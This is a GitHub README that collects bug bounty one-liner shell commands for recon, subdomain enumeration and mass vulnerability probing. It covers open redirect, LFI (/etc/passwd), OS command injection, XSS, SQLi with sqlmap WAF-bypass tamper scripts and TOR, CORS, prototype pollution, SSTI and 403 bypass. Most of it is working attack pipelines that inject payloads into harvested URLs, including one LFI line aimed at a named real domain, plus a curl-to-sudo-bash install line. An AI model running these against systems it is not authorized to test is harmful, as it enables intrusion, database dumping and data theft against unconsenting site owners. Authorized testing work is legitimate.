# oneLineBugBounty
Earn bug bounty codes very helpful and advanced.

# One-Liners for bug bounty
MySpecial


### Redirects 
```bash
cat * | uro | uniq | grep -a -i "=http" | qsreplace "evil.com" | while read -r host; do   response=$(curl -s -L -I "$host" | grep "evil.com");   if [[ ! -z "$response" ]]; then     echo -e "$host \033[0;31mVulnerable\033[0m";     echo "$response";   fi; done
```
### LFI
```bash
echo "https://staff.edmarker.com/index.php?page=111&f_id=735&target=Right" | \
sed 's/111/\/etc\/passwd%00/' | \
while read url; do \
    curl -s "$url" | grep "root:x:" && echo "$url is vulnerable"; \
done
```
### Os Command Injection
```
cat allurls.txt | uro | grep "\?" | sed "s/=./='.system(%27id%27);/" | uniq | while read url; do    curl -s "$url" | grep -i "uid=" && echo "$url is vulnerable to Command Injection";  done
```

### Special urls
```
cat allurls.txt | cat | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```





###### follow and starts❤️
----------------------
![image](https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png)
---------------------------
## One Line recon using pd tools
```
subfinder -d redacted.com -all | anew subs.txt; shuffledns -d redacted.com -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt; dnsx -l subs.txt -r resolvers.txt | anew resolved.txt; naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt; httpx -l ports .txt | anew alive.txt; katana -list alive.txt -silent -nc -jc -kf all -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -aff | anew urls.txt; nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | anew nuclei.txt
```
# Subdomain Enumeration
```
## Juicy Subdomains
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'

## from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 

## from Riddler.io

curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

## from RedHunt Labs Recon API
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r

## from nmap
nmap --script hostmap-crtsh.nse target.com

## from CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

## from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

## from JLDC
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

## from crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

## from ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u

## from Anubis
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"

## from ThreatCrowd
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"

## from HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

## from AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

## from Censys
censys subdomains target.com

## from subdomain center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```
--------
## LFI:
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
----------------------
## Open Redirect:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
```
----------------
## XSS:
### Knoxss mass hunting
```
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```
```
cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt
```
```
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
```
## ffuf json to txt output
```
cat output.json | jq | grep -o '"url": "http[^"]*"' | grep -o 'http[^"]*' | anew out.txt

```
**Search for Sensitive files from Wayback**
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
-------------------
## SQLi:
```
cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```
***Bypass WAF using TOR***
```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```
***find which host is vuln in output folder of sqlmap/ghauri***
``root@bb:~/.local/share/sqlmap/output#``
```
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```
----------------
## CORS:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## JS Files:
### Find JS Files:
```
cat target.txt | (gau || hakrawler || waybackurls || katana) | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew js.txt
```
```
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*\(text/javascript\|application/javascript\)'; then
    echo "$url"
  fi
done < urls.txt > js.txt
```
### Hidden Params in JS:
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
```
echo target.com | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
---------------------------
## Scan IPs
```
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```
## Shodan Cli
```
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
```
### Ffuf.json to only ffuf-url.txt
```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```
## Update golang
```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash
```

## Censys CLI
```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
## Nmap cidr to ips.txt
```
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
```
### Xray urls scan
```
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done
```  
### grep only nuclei info
```
result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
echo "$result"
```
``[sqli-error-based:oracle] [http] [critical] https://test.com/en/events/e5?utm_source=test'&utm_medium=FUZZ'``
### Download js files
```
## curl
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."

## wget
sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done
```
### Filter only html/xml content-types for xss
```
cat urls.txt | httpx -ct -silent -mc 200 -nc | grep -i -E "text/html|text/xml" | cut -d '[' -f 1 | anew xml_html.txt

## using curl
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*text/\(html\|xml\)'; then
    echo "$url"
  fi
done < urls.txt > xml_html.txt
```
### Get favicon hash
```
curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq
```

### Build wordlists from a nuclei templates
```
for i in `grep -R yaml | awk -F: '{print $1}'`; do cat $i | grep 'BaseURL}}/' | awk -F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done
```
### To find dependency confusion(confused)
```
[ -f "urls.txt" ] && mkdir -p downloaded_json && while read -r url; do wget -q "$url" -O "downloaded_json/$(basename "$url")" && scan_output=$(confused -l npm "downloaded_json/$(basename "$url")") && echo "$scan_output" | grep -q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done < <(cat urls.txt)
```
### find params using x8
```
subdomain -d target.com -silent -all -recursive | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w parameters.txt -o output.txt'
```
### find reflected parameters for xss - [xss0r](https://raw.githubusercontent.com/xss0r/xssorRecon/refs/heads/main/reflection.py)
```
python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
```

______________________

## Part 2 

# Bug Bounty Hunting Commands 🚀

## 1. **Find XSS Vulnerabilities**  
Uncover XSS vulnerabilities quickly using `dalfox`.

```bash
cat urls.txt | dalfox pipe --multicast -o xss.txt
```

---

## 2. **Uncover Hidden Parameters in Seconds 🕵️‍♂️**  
Extract hidden parameters from URLs effortlessly.

**Example:**
```bash
cat alive.txt | rush curl -skl "{}" | grep 'type="hidden"' | grep -Eo 'name="[^"]+"' | cut -d'"' -f2 | sort -u | anew params.txt
```

---

## 3. **Reveal Secrets in JavaScript Files 🕵️‍♂️**  
Identify sensitive data in JavaScript files like a pro.

**Example:**
```bash
cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
```

---

## 4. **Crush Directories with Effortless Bruteforce 🔍**  
Discover hidden directories and files effortlessly.

**Example:**
```bash
cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
```

---

## 5. **Expose Log4J Vulnerabilities with Ease 🔍**  
Identify Log4J vulnerabilities on the fly.

**Example:**
```bash
cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u @'
```

---

## 6. **Hunt Down Sneaky Open Redirects 🎯**  
Uncover open redirects like a seasoned hunter.

**Example:**
```bash
gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

---

## 7. **Capture Screenshots in a Snap 📷**  
Capture screenshots of live websites effortlessly.

**Example:**
```bash
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
```

---

## 8. **Know Your WordPress Version 📝**  
Discover the WordPress version of a target website instantly.

**Example:**
```bash
curl -s 'https://target.com/readme.html' | grep 'Version'
```

---

## 9. **Unearth Subdomains Containing JavaScript 🌐**  
Find subdomains with JavaScript files in a snap.

**Example:**
```bash
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
```

---

## 10. **Bypass 403 Login Pages with Finesse 🚪**  
Bypass 403 login pages like a pro.

**Example:**
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```

_________________________
# Part 3 


# Bug Bounty Hunting One-Liner Commands 🚀

## **1. Create a List of IPs and Scan**
Prepare `my_ips.txt` with IP addresses, each on a new line:
```bash
192.168.1.1
10.0.0.1
cat my_ips.txt | xargs -L 100 -I {} shodan scan submit {} --wait 0
```

---

## **2. Convert NMAP CIDR to Wordlist Text**
Prepare `cidr.txt` with CIDR ranges or IP addresses:
```bash
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | grep "Nmap scan report for" | sed "s/Nmap scan report for //g" | anew nmap-ips.txt'
```

---

## **3. Use Shodan in Terminal to Search for IPs**
```bash
shodan search "Ssl.cert.subject.CN:\"target.com\"" --fields ip_str | anew ips.txt
```

---

## **4. Censys for Specific Domain and Extract IP Addresses**
```bash
censys search "target.com" --index-type hosts | jq -c '.results[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```

---

## **5. Resolve and Save IP Addresses from Domains**
```bash
cat live-domain.txt | httpx -ip -silent -timeout 10 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | tee domains-ips.txt
```

---

## **6. Directory Fuzzing**
**Using ffuf**:
```bash
ffuf -c -w urls.txt:URL -W wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
```

**Using Dirsearch**:
```bash
dirsearch -l urls.txt -w /path/to/wordlist.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,tar,zip,txt,xml --deep --recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```

---

## **7. SQLi Vulnerabilities with Katana, Hakrawler, and Gau**
```bash
cat subs.txt | gau || hakrawler || katana || waybackurls | grep "=" | sort -u | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level=5 --risk=3 --dbs && while read -r url; do ghauri -u "$url" --level=3 --dbs --current-db --batch --confirm; done < tmp-sqli.txt
```

---

## **8. SQLMAP with WAF Bypass via TOR**
```bash
sqlmap -r request.txt --time-sec=10 --tor-type=SOCKS5 --check-tor --random-agent --tamper=space2comment --dbs
```

---

## **9. Find Sensitive Information Bugs with Wayback**
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -Eoi '\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar)$'
```

---

## **10. Extract Hidden Parameters in JS Files**
```bash
cat main.js | grep -oE '("[^"]*"|'[^']*'|\/[a-zA-Z0-9_/?=]+)' | sed -E 's/^["\']|["\']$//g' | sort -u
```

---

## **11. Find Hidden Parameters in JS**
```bash
cat subs.txt | gau || hakrawler || waybackurls || katana | sort -u | httpx -silent -threads 100 | grep -Ev '\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt|pdf)$' | while read url; do vars=$(curl -s "$url" | grep -Eo 'var [a-zA-Z0-9_]+' | sed -e 's/var //' -e 's/$/='$url'/g' | grep -Ev '\.js$|[^\w]+\.js|[^\w]+\.js\.[0-9]+$|[^\w]+\.js[0-9]+$' | sed 's/.*/FUZZ=/g'); echo -e "\e[1;33m$url\e[1;32m$vars"; done
```

---

## **12. Subfinder + Httpx for Prototype Pollution Bug**
```bash
subfinder -d target.com -all -silent | httpx -silent -threads 100 | sed 's/$/\/\?__proto__[testparam]=exploit\//' | tee alive.txt | xargs -I % sh -c 'curl -s % | grep -Eo "window.testparam == \"exploit\" ? \"[VULNERABLE]\" : \"[NOT VULNERABLE]\"" | sed -e "s/[ \[\]JS]//g" | grep "VULNERABLE" && echo "%"'
```

---

## **13. Find CORS Vulnerabilities**
```bash
echo target.com | gau || hakrawler || waybackurls || katana | while read url; do if curl -s -I -H "Origin: https://evil.com" -X GET "$url" | grep -q 'Access-Control-Allow-Origin: https://evil.com'; then echo "[Potential CORS Found] $url"; else echo "Nothing on $url"; fi; done
```

---

## **14. Use Favicon Hash to Improve Hunting**
```bash
curl -s "https://favicon-hash.kmsec.uk/api/?url=https://www.google.com/favicon.ico" | jq
```

---

## **15. One-Liner for XSS**
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace '"><script>alert(1)</script>' | while read -r host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31mVulnerable\033[0m"; done
```

---

## **Resources**
- [KingOfBugBountyTips](https://github.com/OfJAAH/KingOfBugBountyTips)
- [Awesome Oneliner Bug Bounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty)
- [Oneliner Bug Bounty](https://github.com/twseptian/oneliner-bugbounty)
